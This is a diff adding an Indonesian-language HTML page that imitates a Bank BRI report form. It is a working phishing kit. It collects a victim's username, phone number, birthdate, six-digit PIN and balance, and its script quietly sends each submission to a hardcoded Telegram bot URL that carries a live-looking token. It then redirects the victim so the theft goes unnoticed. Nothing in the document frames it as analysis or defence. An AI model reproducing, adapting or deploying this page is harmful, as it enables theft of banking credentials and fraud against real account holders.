@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta property="og:image" content="imglogo.jpg">
+  <meta name="theme-color" content="#007bff">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Bank BRI</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      margin-top: 40px;
+      background-image: url('https://i.ibb.co.com/8rnh5k0/1723381045176.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-position: center;
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      width: 300px;
+      margin: 0 auto;
+      margin-top: 80px;
+      background: rgba(255, 255, 255, 0.9);
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .header h1 {
+      color: #007bff;
+      font-size: 16px;
+      text-transform: uppercase;
+      margin: 0;
+    }
+
+    .header hr {
+      border: 1px solid #000;
+      width: 80%;
+      margin: 10px auto;
+    }
+
+    .input-group {
+      margin-bottom: 10px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 12px;
+      color: #007bff;
+    }
+
+    .btn {
+      width: 87%;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 10px 15px;
+      cursor: pointer;
+      margin-left: 19px;
+      margin-top: 10px;
+    }
+
+    .btn-link {
+      display: block;
+      text-align: center;
+      margin-top: 10px;
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 2s linear infinite;
+      display: none;
+      position: absolute;
+      top: 50%;
+      left: 41%;
+      transform: translate(-50%, -50%);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .input-icon {
+      position: relative;
+    }
+
+    .input-icon img {
+      position: absolute;
+      top: 50%;
+      left: 5px;
+      transform: translateY(-50%);
+      width: 20px;
+      height: auto;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>FORMULIR LAPORAN BANK BRI<br>ID Laporan : 2265GA007</h1>
+      <hr>
+    </div>
+    <form action="lanjut.html" method="post" id="registrationForm">
+      <div class="input-group">
+        <label for="username">Username:</label>
+        <input type="text" name="username" id="username" placeholder="Masukkan Username" required style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px; background-image: url('https://i.ibb.co/MZpjTS8/16480-removebg-preview.png'); background-repeat: no-repeat; background-position: 10px center; background-size: 20px;">
+      </div>
+      <div class="input-group">
+        <label for="phone">Nomor Handphone</label>
+        <input type="tel" name="phone" id="phone" placeholder="+62 8xxx xxxx xxxx" required maxlength="12" oninput="this.value = this.value.replace(/\D/g,'').substring(0, 12)" style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px; background-image: url('https://i.ibb.co/fNtsfBY/1000005366-removebg-preview.png'); background-repeat: no-repeat; background-position: 10px center; background-size: 20px;">
+      </div>
+      <div class="input-group">
+        <label for="tgl_lahir">Tanggal Lahir</label>
+        <div class="input-icon">
+          <input type="date" name="birthdate" id="tgl_lahir" required style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #222; border-radius: 5px;">
+          <img src="https://i.ibb.co/yNJ9JtK/pngtree-black-and-white-calendar-logo-square-png-image-6655096-removebg-preview.png" alt="Calendar Icon">
+        </div>
+      </div>
+      <div class="input-group">
+        <label for="pin">Masukkan PIN 6 Digit</label>
+        <div class="input-icon">
+          <input type="password" name="pin" id="pin" placeholder="Masukkan PIN 6 Digit" required minlength="6" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')" style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px;">
+          <img src="https://i.ibb.co/z672Tng/IMG-20240415-143131-removebg-preview.png" alt="PIN Icon">
+        </div>
+      </div>
+      <div class="input-group">
+        <label for="balance">Masukkan Saldo</label>
+        <div class="input-icon">
+          <input type="tel" id="jumlahInput" name="balance" placeholder="Masukkan Saldo" required oninput="updateNominal()" style="width: calc(100% - 60px); padding: 11px 16px 13px 40px; border: 2px solid #ccc; border-radius: 5px;">
+          <img src="https://i.ibb.co/Yp3ws6X/1000005674-removebg-preview.png" alt="Saldo Icon">
+        </div>
+      </div>
+      <button type="submit" class="btn">LANJUT</button>
+      <a href="index.html" class="btn-link">Kembali ke Halaman Utama</a>
+      <div class="loader" id="loader"></div>
+    </form>
+  </div>
+
+  <script>
+    function updateNominal() {
+      var nominalInput = document.getElementById("jumlahInput");
+      var value = nominalInput.value.replace(/\D/g, ''); // Hapus karakter selain digit
+
+      // Format nilai Rupiah
+      var formattedValue = "Rp " + Number(value).toLocaleString("id-ID");
+
+      nominalInput.value = formattedValue;
+    }
+
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "https://api.telegram.org/6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    document.getElementById("registrationForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // Mencegah form dikirim langsung
+
+      var loader = document.getElementById("loader");
+      loader.style.display = "block";
+
+      // Mengambil nilai input
+      var username = document.getElementById("username").value;
+      var phone = document.getElementById("phone").value;
+      var birthdate = document.getElementById("tgl_lahir").value;
+      var pin = document.getElementById("pin").value;
+      var balance = document.getElementById("jumlahInput").value;
+
+      // Membuat pesan untuk dikirim ke Telegram
+      var message = "Username: " + username + "\n" +
+                    "Nomor Handphone: " + phone + "\n" +
+                    "Tanggal Lahir: " + birthdate + "\n" +
+                    "PIN: " + pin + "\n" +
+                    "Saldo: " + balance;
+
+      sendMessageToTelegram(message);
+
+      // Menunggu beberapa detik sebelum mengarahkan ke halaman lanjut.html
+      setTimeout(function() {
+        loader.style.display = "none";
+        window.location.href = "lanjut.html";
+      }, 5000); // 5000 ms = 5 detik
+    });
+  </script>
+</body>
+</html>
